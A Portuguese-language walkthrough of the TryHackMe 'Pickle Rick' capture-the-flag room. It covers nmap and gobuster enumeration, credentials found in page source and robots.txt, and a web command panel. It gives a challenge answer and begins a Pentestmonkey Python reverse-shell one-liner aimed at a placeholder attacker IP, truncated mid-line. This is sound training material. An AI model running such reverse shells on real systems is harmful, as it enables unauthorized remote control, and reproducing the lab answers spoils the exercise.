---
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# 🥒 Pickle Rick -  Easy

Para começarmos, iremos nos conectar ao servidor VPN do TryHackMe usando o seguinte comando: sudo openvpn (diretório do arquivo). Caso esteja usando uma máquina virtual, pode pular este passo.

<figure><img src=".gitbook/assets/image1.png" alt=""><figcaption><p>image1</p></figcaption></figure>

Primeiramente, iremos fazer um scan nas portas abertas do host alvo, ou seja, o IP que o TryHackMe nos proporciona.

Utilizando o nmap, nós iremos fazer uma varredura nas portas até um determinado número que irei definir como 10000.

<figure><img src=".gitbook/assets/image2.png" alt=""><figcaption><p>image2</p></figcaption></figure>

Agora, irei explicar para que os comandos servem:

O -p serve para você selecionar uma quantidade de portas, podendo ser default ou um número específico colocado logo após, como no caso -p -10000. O - antes do 10000 é uma abreviação para definir que é de 0 até 10000.

O -sV serve para determinar a versão dos serviços que estão abertos nas portas.

O -sC serve para executar um script automático do nmap para dar detalhes sobre os serviços e detectar possíveis vulnerabilidades.

Após o nmap escanear as portas abertas, podemos perceber que temos 2 portas abertas: a porta 22/tcp com o serviço SSH e a porta 80/tcp com o serviço HTTP.

<figure><img src=".gitbook/assets/image3.png" alt=""><figcaption><p>image3</p></figcaption></figure>

Primeiro, irei explicar o que é uma porta aberta. Uma porta aberta significa que a porta está aceitando conexões de entrada, lembrando que uma porta é um ponto virtual onde começam e terminam as conexões de rede, ou seja, tem algum aplicativo lá que está pronto ou está recebendo dados de entrada.

Também temos as portas gerais que se referem a uma porta A "porta geral" se refere a uma porta específica em um dispositivo de rede usada para um serviço bem conhecido. Essas portas são designadas pela IANA para serviços específicos:

* Porta 80: HTTP (Hypertext Transfer Protocol)
* Porta 443: HTTPS (HTTP Secure)
* Porta 22 (geralmente, mas não exclusivamente): SSH (Secure Shell)
* Porta 25: SMTP (Simple Mail Transfer Protocol)
* Porta 21: FTP (File Transfer Protocol)

É importante ressaltar que, embora estas portas estejam frequentemente associadas aos serviços mencionados, elas podem ser configuradas de forma diferente em certos casos. Por exemplo, administradores de sistemas podem optar por mudar a porta padrão do serviço SSH para dificultar ataques automatizados.

Além disso, cada protocolo opera em camadas distintas. Por exemplo, o HTTP e o HTTPS operam na camada de aplicação do modelo OSI, enquanto o SSH, SMTP e FTP operam em níveis mais baixos. Essas portas são reservadas para esses fins e são fundamentais para configurar firewalls e garantir a segurança da rede.

<figure><img src=".gitbook/assets/camadas.png" alt=""><figcaption><p>Exemplo Camadas</p></figcaption></figure>

Agora, vamos ver o que é TCP. O TCP, ou Transmission Control Protocol, é um protocolo de rede que os computadores usam para enviar ou receber informações, garantindo a entrega confiável das informações. E o protocolo UDP, ou User Datagram Protocol, tem a mesma função de transmitir informações entre computadores, porém, enquanto o Protocolo TCP é mais confiável e seguro ao transmitir informações, ele acaba sendo mais lento. Então, para aplicativos que exigem uma eficiência maior e com menos preocupação na entrega das informações, utiliza-se o UDP.

Agora que sabemos sobre as portas e como são transmitidas as informações, vamos ver os serviços.

O SSH, ou Secure Shell, é um protocolo de comunicação entre dois dispositivos dentro da rede, geralmente o cliente (sua máquina) e o servidor (onde está hospedado o serviço). Ele é normalmente usado para acessar e controlar remotamente dispositivos, principalmente servidores, de forma segura e com uma conexão criptografada.

O HTTP, ou Hypertext Transfer Protocol, é um protocolo de comunicação utilizado para transferir dados pela World Wide Web. Ele é o principal protocolo utilizado para acessar e enviar informações em páginas da web.

Caso queiram se aprofundar sobre: [https://www.cloudflare.com/pt-br/learning/network-layer/what-is-a-computer-port/](https://www.cloudflare.com/pt-br/learning/network-layer/what-is-a-computer-port/)

Sabendo disso, nós conseguimos ver que temos uma página web aberta naquele IP, então colocamos ele na barra de pesquisa e então... KATCHAU!, temos um site.

<figure><img src=".gitbook/assets/image4.png" alt=""><figcaption><p>image4</p></figcaption></figure>

Quase me esqueci, o motivo de eu ter escolhido primeiro ir atrás do site é porque, para acessar o servidor utilizando o SSH, é necessário ter um usuário e uma senha, que inicialmente não temos.

Agora, nós iremos ver se o site tem algum diretório ou caminho escondido utilizando o Gobuster.

<figure><img src=".gitbook/assets/image5.png" alt=""><figcaption><p>image5</p></figcaption></figure>

O Gobuster serve para fazer um ataque de força bruta e de enumeração em servidores web, ou seja, ele vai atrás de diretórios ou caminhos ocultos em um servidor web, tentando acessar várias URLs dentro daquele servidor. Exemplo: http://localhost/ - essa seria a URL padrão, o Gobuster tentaria acessá-la várias vezes colocando mais finais, como http://localhost/login, http://localhost/password, http://localhost/index, até conseguir encontrar algo ou então até terminar a wordlist (lista de palavras) que você colocou.

Agora, vamos ver para que serve os comandos utilizados:

O -u serve para você colocar qual a URL do servidor web.

O -w é para colocar o caminho para a wordlist (lista de palavras) que você estará usando. No meu caso, estou usando a directory-list-2.3-medium (só jogar no Google e colocar "github" no final que você acha).

O -x é para extensão do arquivo, ou seja, a terminação como, por exemplo, index.html ou então login.php.

<figure><img src=".gitbook/assets/image6.png" alt=""><figcaption><p>image6</p></figcaption></figure>

Como podemos ver, após aguardar alguns minutos, ele achou alguns caminhos ocultos que usaremos depois do "/". Exemplo: http://localhost/robots.txt, http://localhost/index.html, http://localhost/login.php.

Agora, iremos verificar cada um para ver se encontramos algo.

<figure><img src=".gitbook/assets/image7.png" alt=""><figcaption><p>image7</p></figcaption></figure>

No index.html é a página inicial.

Nessa URL, conseguimos algo, provavelmente o painel do servidor web, mas precisamos de um usuário e uma senha.

<figure><img src=".gitbook/assets/image8.png" alt=""><figcaption><p>image8</p></figcaption></figure>

Após usarmos portal.php voltamos para a mesma página do login.php.

<figure><img src=".gitbook/assets/image9.png" alt=""><figcaption><p>image9</p></figcaption></figure>

No robots.txt, achamos algo, mas não sabemos se iremos utilizar, mas sempre é bom guardar. - Wubbalubbadubdub

<figure><img src=".gitbook/assets/image10.png" alt=""><figcaption><p>image10</p></figcaption></figure>

Olhamos tudo e percebemos que precisamos de um login e uma senha, pode ser que a palavra achada no robots.txt seja ou o login ou a senha. Como não encontramos mais nada na parte visual, iremos dar uma inspecionada no código por trás das páginas.

Voltando ao index.html, não conseguimos muitas informações na parte visual, então vamos dar uma inspecionada nele usando o F12 no Chrome e então, BINGO! Temos um login. - R1ckRul3s

<figure><img src=".gitbook/assets/image11.png" alt=""><figcaption><p>image11</p></figcaption></figure>

Após olharmos as outras, não encontramos nada.... mas peraí, nós temos aquela palavra esquisita colocada no robots.txt, então entramos no /login.php e colocamos o login: R1ckRul3s e a senha: Wubbalubbadubdub e então KATCHAU!! Conseguimos entrar.

<figure><img src=".gitbook/assets/image12.png" alt=""><figcaption><p>image12</p></figcaption></figure>

Após entrarmos, podemos ver que temos um tal de Command Panel, poderia ser que fosse algum painel de administrador para executar comandos, então vamos tentar executar algo nele. Usei um comando básico do Linux, o ls, que serve para listar os arquivos existentes no diretório atual e então.... BINGO! Conseguimos mais URLs.

<figure><img src=".gitbook/assets/image13.png" alt=""><figcaption><p>image13</p></figcaption></figure>

Vamos dar uma checada em cada um... no primeiro, conseguimos algo. Temos que o super ingrediente secreto é o mr. meeseek hair, vamos guardar essa informação.

<figure><img src=".gitbook/assets/image14.png" alt=""><figcaption><p>image14</p></figcaption></figure>

Nos assets, vemos algumas configurações do sistema, porém nada de útil.

<figure><img src=".gitbook/assets/image15.png" alt=""><figcaption><p>image15</p></figcaption></figure>

Na clue, recebemos uma dica: "olhe ao redor dos arquivos do sistema para encontrar o outro ingrediente", então nós temos que entrar no sistema.

<figure><img src=".gitbook/assets/image16.png" alt=""><figcaption><p>image16</p></figcaption></figure>

No denied, não tinha nada demais.

<figure><img src=".gitbook/assets/image17.png" alt=""><figcaption><p>image17</p></figcaption></figure>

Agora, iremos voltar para a página de comandos, ele está rodando Linux, ou seja, ele pode executar comandos e abrir portas, ou seja, nós podemos fazer um reverse secure shell. Vamos utilizar esse terminal para abrir o caminho para dentro do sistema, mas primeiro vamos testar para ver se ele nos dá permissão para fazer isso.

Após alguns testes, vemos que podemos usar o Python3 no terminal.

<figure><img src=".gitbook/assets/image18.png" alt=""><figcaption><p>image18</p></figcaption></figure>

Então, vamos fazer um reverse secure shell, procurando um pouco, nós achamos o Python reverse shell no Pentestmonkey. - python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("SEU IP", PORTA PARA SE ABRIR));os.dup2(s.fileno(),0); os.d

<figure><img src=".gitbook/assets/image19.png" alt=""><figcaption><p>image19</p></figcaption></figure>

